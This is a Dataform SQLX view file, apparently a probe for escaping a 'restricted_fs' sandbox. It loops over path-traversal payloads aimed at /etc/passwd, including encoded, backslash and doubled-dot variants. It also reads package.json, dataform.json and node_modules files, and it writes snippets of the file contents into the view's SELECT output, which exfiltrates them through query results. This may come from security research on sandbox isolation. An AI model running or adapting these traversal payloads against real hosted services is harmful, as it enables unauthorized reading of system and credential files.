-- Path Traversal Test
-- Tests if we can escape restricted_fs via ../ or symlinks

config {
  type: "view",
  name: "path_traversal_test"
}

js {
  let results = [];

  // Test 1: Simple path traversal
  const traversalPaths = [
    "../package.json",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    "/etc/passwd",
    "..\\..\\etc\\passwd",
    "%2e%2e%2fetc%2fpasswd",
    "....//....//etc/passwd",
    "./../etc/passwd"
  ];

  for (const p of traversalPaths) {
    try {
      const exists = restricted_fs.exists(p);
      if (exists) {
        try {
          const content = restricted_fs.readFile(p);
          results.push("EXISTS_READABLE " + p + ": " + content.substring(0, 50));
        } catch(e) {
          results.push("EXISTS_UNREADABLE " + p + ": " + e.message);
        }
      } else {
        results.push("NOT_EXISTS " + p);
      }
    } catch(e) {
      results.push("ERROR " + p + ": " + e.message.substring(0, 100));
    }
  }

  // Test 2: Try to list root directory
  try {
    const isRoot = restricted_fs.isDirectory("/");
    results.push("IsRootDir: " + isRoot);
  } catch(e) {
    results.push("IsRootDir: FAIL - " + e.message);
  }

  // Test 3: Check what restricted_fs thinks root is
  try {
    const isProject = restricted_fs.isDirectory(".");
    results.push("IsDotDir: " + isProject);
  } catch(e) {
    results.push("IsDotDir: FAIL - " + e.message);
  }

  // Test 4: Can we read package.json?
  try {
    const content = restricted_fs.readFile("package.json");
    results.push("PackageJson: " + content.substring(0, 100));
  } catch(e) {
    results.push("PackageJson: FAIL - " + e.message);
  }

  // Test 5: Can we read dataform.json?
  try {
    const content = restricted_fs.readFile("dataform.json");
    results.push("DataformJson: " + content.substring(0, 100));
  } catch(e) {
    results.push("DataformJson: FAIL - " + e.message);
  }

  // Test 6: Can we read node_modules?
  try {
    const exists = restricted_fs.exists("node_modules");
    const isDir = restricted_fs.isDirectory("node_modules");
    results.push("NodeModules: exists=" + exists + ", isDir=" + isDir);
  } catch(e) {
    results.push("NodeModules: FAIL - " + e.message);
  }

  // Test 7: Read @dataform/core
  try {
    const content = restricted_fs.readFile("node_modules/@dataform/core/package.json");
    results.push("DataformCore: " + content.substring(0, 100));
  } catch(e) {
    results.push("DataformCore: FAIL - " + e.message);
  }

  // Test 8: Check path module for resolve
  try {
    const resolved = path.resolve("../../../etc/passwd");
    results.push("PathResolve: " + resolved);
  } catch(e) {
    results.push("PathResolve: FAIL - " + e.message);
  }
}

SELECT
  '${JSON.stringify(results)}' as traversal_results
